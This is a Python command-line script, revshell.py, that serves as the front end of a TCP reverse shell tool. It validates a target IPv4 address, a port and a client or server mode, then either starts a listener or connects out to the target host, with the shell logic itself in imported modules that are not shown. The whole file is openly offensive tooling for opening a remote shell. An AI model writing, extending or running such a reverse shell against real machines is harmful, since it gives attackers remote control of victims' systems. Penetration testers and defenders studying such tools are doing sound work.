#!/usr/bin/python3
import argparse

from multi import utils
from multi.nodes.server import Server
from multi.nodes.client import Client

parser = argparse.ArgumentParser(
    prog="revshell.py",
    description="RevShell: Python3 TCP reverse shell utility"
)

parser.add_argument("target", type=str, nargs="?", help="target ip address")
parser.add_argument("-v", "--verbose", action="store_true", help="verbose output")
parser.add_argument("-m", "--mode", type=str, help="operation mode [client|server]")
parser.add_argument("-p", "--port", type=int, help="port to use as TCP socket")

args = parser.parse_args()

target: str = args.target
verbose: bool = args.verbose
mode: str = args.mode
port: int = args.port

if __name__ == "__main__":
    if (not target) & (not mode):
        msg = "one or both of the following arguments are required: "
        parser.error(msg + "target, -m/--mode")
        exit(1)

    if not target:
        if (not mode) | (mode.lower() == "client"):
            utils.throw("Value for [target] can't be null if running in client mode")
    else:
        if not utils.ipv4_parse(target):
            utils.throw("Value for [target] is not a valid IPv4 address")

    if verbose:
        if not target:
            utils.status("target => 0.0.0.0")
        else:
            utils.status(f"target => {target}")

    if not (mode is None):
        if mode.lower() not in ["client", "server"]:
            utils.throw("Expected <mode> to be 'client' or 'server'")
    else:
        mode = "client"

    if verbose:
        utils.status(f"mode => {mode.lower()}")

    if mode == "server":
        if not (target is None):
            if not (port is None):
                handler = Server(target, port)
            else:
                handler = Server(target)
        else:
            if not (port is None):
                handler = Server(port=port)
            else:
                handler = Server()

        handler.listen()
    else:
        if not (port is None):
            handler = Client(target, port)
        else:
            handler = Client(target)

        handler.connect()
